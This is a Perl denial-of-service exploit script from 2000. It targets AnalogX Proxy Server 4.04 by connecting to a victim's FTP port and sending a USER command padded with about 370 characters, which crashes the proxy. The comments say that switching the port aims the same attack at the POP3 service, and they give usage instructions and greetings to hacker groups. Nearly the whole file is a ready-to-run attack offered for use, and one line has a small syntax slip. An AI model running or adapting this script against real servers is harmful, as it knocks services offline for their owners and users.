#!/usr/bin/perl
#
# analogX-DoS.pl
# AnalogX Proxy Server 4.04 Denile-of-Service attack
# coded by slash <tcsh@b0f.i-p.com>
#
# Sending an FTP "USER" command containing approximately 370 or more 
# characters to the proxy server FTP TCP port 21 will crash it. This 
# allso applyes to the POP3 service. Which meens if You are planing 
# on attacking the POP3 server, you just need to change the port and
# it will work.
#
# Usage: [slash@linux]# ./analogX-DoS.pl <victim> <port>
#
# Based on Foundstone advisory (ID: FS-072500-7-ANA.txt)released on 
# July 25. For more information visite: http://www.foundstone.com/
#
# Greetz: Scrippie, HWA, eth0, sirius, Cruciphux, Mixter, #!/bin/zsh
# all the synnergy people and all the croatian hackers.


use IO::Socket;

$host = $ARGV[0];
$port = $ARGV[1];
$a = A
$evil = $a x 370;
$wait = 10;

# Connecting to host.
print "Trying to connect to $host:$port...";
$socket = IO::Socket::INET->
	    new(Proto=>"tcp", 
	    PeerAddr=>$host, 
	    PeerPort=>$port) 
	    || die "Connection failed.\n";

print "Sending evil string...\n";
print $socket "USER $evil\@aol.com\n";

print "Waiting...";
$time = 0;
while ($time < $wait) {
        sleep(1);
        print ".";
        $time += 1;
}

# Finished.
close($socket);
print "\nConnection closed. Finished.\n";

# EOF
#                   www.hack.co.za   [4 September 2000]#